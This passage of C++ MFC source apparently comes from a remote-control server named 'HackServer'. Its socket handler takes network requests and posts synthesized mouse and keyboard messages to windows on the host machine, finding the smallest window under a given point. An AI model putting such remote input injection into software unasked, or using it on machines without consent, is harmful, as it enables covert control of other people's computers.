	if(req->MsgType==INPUT_MOUSE)
	{
		CString str;
		POINT p;
		p.x=GET_X_LPARAM(req->lParam);
		p.y=GET_Y_LPARAM(req->lParam);
        HWND hnd=CRemoteSock::SmallestWindowFromPoint(p);
		if(hnd==NULL)
		{
			goto EXIT;
		}

		::ScreenToClient(hnd,&p);
		
		CDC *cdcMyDC=CDC::FromHandle(::GetWindowDC(hnd));;
		LPARAM lparam=MAKELPARAM(p.x,p.y);

		/*CPen MyPen(PS_SOLID,1,RGB(255,0,0));
		CBrush MyBrush;
		MyBrush.CreateSolidBrush(RGB(255,0,0));
		cdcMyDC->SelectObject(&MyPen);
		cdcMyDC->SelectObject(&MyBrush);

		//::ClientToScreen(hnd,&p);
		RECT rect;
		::GetWindowRect(hnd,&rect);
		
		rect.left=p.x-10;rect.right=p.x+10;	rect.top=p.y-10;rect.bottom=p.y+10;
		cdcMyDC->Rectangle(&rect);*/
		::PostMessage(hnd,req->message,req->wParam,lparam);
	}
	else
	{
		GUITHREADINFO guiinf;
		::GetGUIThreadInfo(NULL,&guiinf);
		HWND hwnd=guiinf.hwndFocus;
		::PostMessage(hwnd,req->message,req->wParam,req->lParam);
	}
EXIT:
	int DataSize=sizeof(int)+sizeof(SynthInputReply);
	char* retdata=new char[DataSize];
	*((int*)retdata)=DataSize;
	memcpy((void*)(retdata+sizeof(int)),(void*)&rply,sizeof(SynthInputReply));
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SynthInput function executed successfully");
	return (void*)retdata;

}
//===================================================================

HWND CRemoteSock::SmallestWindowFromPoint(const POINT point)
{	
	RECT rect,rcTemp;
	HWND hParent,hWnd,hTemp;

	hWnd=::WindowFromPoint(point);
	if(hWnd!=NULL)
	{
		::GetWindowRect(hWnd,&rect);
		hParent=::GetParent(hWnd);

		
		if(hParent!=NULL)
		{
			
			hTemp=hWnd;
			do
			{
				hTemp=::GetWindow(hTemp,GW_HWNDNEXT);

				
				::GetWindowRect(hTemp,&rcTemp);
				if((::PtInRect(&rcTemp,point))&&(::GetParent(hTemp)==hParent)&&(::IsWindowVisible(hTemp)))
				{
					
					if(((rcTemp.right-rcTemp.left)*(rcTemp.bottom-rcTemp.top))<((rect.right-rect.left)*(rect.bottom-rect.top)))
					{
						hWnd=hTemp;
						::GetWindowRect(hWnd,&rect);
					}
				}
			}while(hTemp!=NULL);
		}
	}
	return hWnd;
}

void CRemoteSock::OnSend(int nErrorCode)
{
	/*CString logstr;
	if(nErrorCode==0)
	{
		logstr="The function executed successfully";
	}
	else
	{
		logstr="The Windows Sockets implementation detected that the network subsystem failed";		
	}
	
	CString log;
	log.Format("Upon Sending the Packet nErrorCode=", nErrorCode);
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog(log+" **** "+logstr);*/

	CSocket::OnSend(nErrorCode);
}
